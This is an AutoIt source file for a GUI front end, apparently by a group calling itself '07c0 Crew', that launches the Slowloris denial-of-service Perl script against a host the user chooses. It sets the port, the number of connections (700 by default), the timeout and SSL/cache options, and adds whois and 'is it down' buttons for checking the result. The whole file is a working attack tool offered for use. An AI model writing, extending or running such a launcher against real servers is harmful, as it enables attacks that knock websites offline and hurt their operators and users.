#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_Icon=Converse-Red.ico
#AutoIt3Wrapper_UseUpx=n
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

#include <ButtonConstants.au3>
#include <EditConstants.au3>
#include <GUIConstantsEx.au3>
#include <StaticConstants.au3>
#include <WindowsConstants.au3>
$frmMain = GUICreate("Slowloris v0.7 Gui by 07c0 Crew", 301, 477, -1, -1)
$txtHost = GUICtrlCreateInput("www.spam.de", 16, 129, 177, 21)
$txtPort = GUICtrlCreateInput("80", 16, 185, 177, 21)
$txtConnections = GUICtrlCreateInput("700", 16, 244, 177, 21)
$txtTimeout = GUICtrlCreateInput("30", 16, 303, 177, 21)
$chkCache = GUICtrlCreateCheckbox("Cache", 16, 344, 65, 21)
$chkSSL = GUICtrlCreateCheckbox("SSL", 128, 344, 65, 21)
$cmdTest = GUICtrlCreateButton("Test timeout", 200, 300, 89, 24)
$picCrew = GUICtrlCreatePic(@ScriptDir & "\title.jpg", 8, 8, 283, 93, BitOR($GUI_SS_DEFAULT_PIC,$WS_BORDER))
$grpMain = GUICtrlCreateGroup("", 2, -4, 297, 479)
$lblUrl = GUICtrlCreateLabel("URL:", 14, 110, 29, 17)
$lblPort = GUICtrlCreateLabel("Port:", 14, 165, 26, 17)
$lblTimeOut = GUICtrlCreateLabel("Timeout:", 14, 283, 45, 17)
$lblConnections = GUICtrlCreateLabel("Connections:", 14, 224, 66, 17)
$lblInfo = GUICtrlCreateLabel("Install ActivePerl. Download *click*", 40, 446, 205, 14)
GUICtrlSetFont(-1, 8, 800, 0, "MS Sans Serif")
GUICtrlSetColor(-1, 0xFF0000)
$cmdDown = GUICtrlCreateButton("Down?", 201, 206, 89, 24)
$cmdWhois = GUICtrlCreateButton("Whois", 201, 166, 89, 24)
$cmdStart = GUICtrlCreateButton("DoS", 201, 126, 89, 23)
$txtPerl = GUICtrlCreateInput("C:\Perl\bin\Perl.exe", 16, 412, 225, 21)
GUICtrlSetState(-1, $GUI_DISABLE)
$cmdPerl = GUICtrlCreateButton("...", 250, 410, 33, 24)
$lblOption = GUICtrlCreateLabel("Option:", 16, 392, 38, 16)
$gprMain2 = GUICtrlCreateGroup("", 7, 98, 286, 280)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUICtrlCreateGroup("", -99, -99, 1, 1)
GUISetState(@SW_SHOW)


If FileExists(@ScriptDir & "\option.slo") Then
   Dim $optr = FileOpen(@ScriptDir & "\option.slo", 0)
   GUICtrlSetData($txtPerl, FileReadLine($optr))
   FileClose($optr)
EndIf

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit
		 Case $cmdTest
			ShellExecute(GUICtrlRead($txtPerl), @ScriptDir & "\slowloris.pl -dns " & GUICtrlRead($txtHost) & " -port " & GUICtrlRead($txtPort) & " -test")
		 Case $cmdStart
			If GUICtrlRead($chkcache) = 1 And GUICtrlRead($chkSSL) = 1 Then
			   ShellExecute(GUICtrlRead($txtPerl), @ScriptDir & "\slowloris.pl -dns " & GUICtrlRead($txtHost) & " -port " & GUICtrlRead($txtPort) & " -timeout " & GUICtrlRead($txtTimeout) & " -num " & GUICtrlRead($txtConnections) & " -cache -ssl")
			ElseIf GUICtrlRead($chkcache) = 1 Then
			   ShellExecute(GUICtrlRead($txtPerl), @ScriptDir & "\slowloris.pl -dns " & GUICtrlRead($txtHost) & " -port " & GUICtrlRead($txtPort) & " -timeout " & GUICtrlRead($txtTimeout) & " -num " & GUICtrlRead($txtConnections) & " -cache")
			ElseIf GUICtrlRead($chkSSL) = 1 Then
			   ShellExecute(GUICtrlRead($txtPerl), @ScriptDir & "\slowloris.pl -dns " & GUICtrlRead($txtHost) & " -port " & GUICtrlRead($txtPort) & " -timeout " & GUICtrlRead($txtTimeout) & " -num " & GUICtrlRead($txtConnections) & " -ssl")
			Else
			   ShellExecute(GUICtrlRead($txtPerl), @ScriptDir & "\slowloris.pl -dns " & GUICtrlRead($txtHost) & " -port " & GUICtrlRead($txtPort) & " -timeout " & GUICtrlRead($txtTimeout) & " -num " & GUICtrlRead($txtConnections))
			EndIf
		 Case $cmdPerl
			Dim $file = FileOpenDialog("File selection", @ScriptDir, "Executable(*.exe)", 1 + 2, "Perl.exe")

			If @error Then
				MsgBox(4096, "", "No File chosen!")
			 Else
				GUICtrlSetData($txtPerl, $file)
				Dim $optw = FileOpen(@ScriptDir & "\option.slo", 2)
				FileWriteLine($optw, $file)
				FileClose($optw)
			EndIf
		 Case $lblInfo
			ShellExecute("http://www.activestate.com/activeperl/downloads")
		 Case $cmdWhois
			ShellExecute("http://whois.domaintools.com/" & GUICtrlRead($txtHost))
		 Case $cmdDown
			ShellExecute("http://www.downforeveryoneorjustme.com/" & GUICtrlRead($txtHost))
	EndSwitch
WEnd


